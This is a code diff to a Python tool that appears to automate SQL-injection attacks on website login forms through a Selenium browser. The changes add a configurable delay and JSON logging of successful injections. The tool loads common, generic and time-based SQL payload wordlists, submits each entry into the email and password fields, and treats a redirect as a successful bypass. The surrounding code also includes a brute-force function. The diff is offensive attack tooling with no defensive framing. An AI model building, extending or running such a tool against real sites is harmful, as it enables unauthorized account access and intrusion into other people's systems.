@@ -11,6 +11,8 @@ from modules.mods import *
 import requests
 import string 
 import random
+import json
+from colorama import *
 
 box_width = 49
 
@@ -30,7 +32,7 @@ def generate_random_string(length=8):
     random_string = ''.join(random.choice(characters) for _ in range(length))
     return random_string
 
-def inject(url, driver, response, payload=1,wordlist=""):
+def inject(url, driver, response, wordlist, payload, delay):
 
     # Initialize lists to store the actual WebElement objects
     email_elements = []
@@ -40,6 +42,7 @@ def inject(url, driver, response, payload=1,wordlist=""):
     # Get the URL from the webdriver
     driver.get(url)
     driver.implicitly_wait(3)
+    
 
     try:
         # Find elements by ID and NAME for password inputs
@@ -84,26 +87,23 @@ def inject(url, driver, response, payload=1,wordlist=""):
 
     # Call the logo function
     logo(url, response, count, pwd)
-    
-    if wordlist == "":
-     if payload == 1:
+          
+    if payload == 1 or payload == 0:
+      if payload == 0:
+            print(f"⟪ {Fore.RED + "Using Defualt Wordlist" + Fore.RESET}                        ⟫")
+            print("⟪                                               ⟫")
       with open('dict/sql-common.txt', 'r') as file:
     # Read all lines and add them to a list
           lines = file.readlines()
 
-     if payload == 2:
+    if payload == 2:
       with open('dict/sql-generic.txt', 'r') as f:
           lines = f.readlines()
 
-     if payload == 3:
+    if payload == 3:
       with open('dict/sql-time.txt', 'r') as f:
           lines = f.readlines()
-    else:
-     try:
-      with open(wordlist, 'r') as f:
-          lines =  f.readlines()
-     except Exception:
-      print("Error with wordlist")
+    
 
 
     email_credentials = [line.strip() for line in lines]
@@ -138,7 +138,7 @@ def inject(url, driver, response, payload=1,wordlist=""):
                 password_elements[0].send_keys(Keys.RETURN)
 
                 # Wait for the page to potentially redirect
-                time.sleep(5)
+                time.sleep(delay)
 
                 # Check if the URL has changed (indicating a redirect)
                 current_url = driver.current_url
@@ -151,7 +151,8 @@ def inject(url, driver, response, payload=1,wordlist=""):
                     print(f"⟪ {current_url}           ⟫")
                     if current_url != "": 
                         print("⟪                                               ⟫")
-                        print(create_box_line(f"Injection: {Fore.GREEN + 'Successful' + Fore.RESET}", 60, "left"))
+                        print(create_box_line(f"Injection: {Fore.GREEN + 'Successful' + Fore.RESET}", 59, "left"))
+                        save_to_json(url, num)
                         print("⟪                                               ⟫")
                     else:
                         print(create_box_line(f"Injection: {Fore.RED + 'Failure :(' + Fore.RESET}", 49, "left"))
@@ -166,6 +167,7 @@ def inject(url, driver, response, payload=1,wordlist=""):
                         
     # Keep the browser open for 10 seconds before closing
     time.sleep(10)
+    
 
 def brute(url,driver,response):
     print("⟪===============================================⟫")
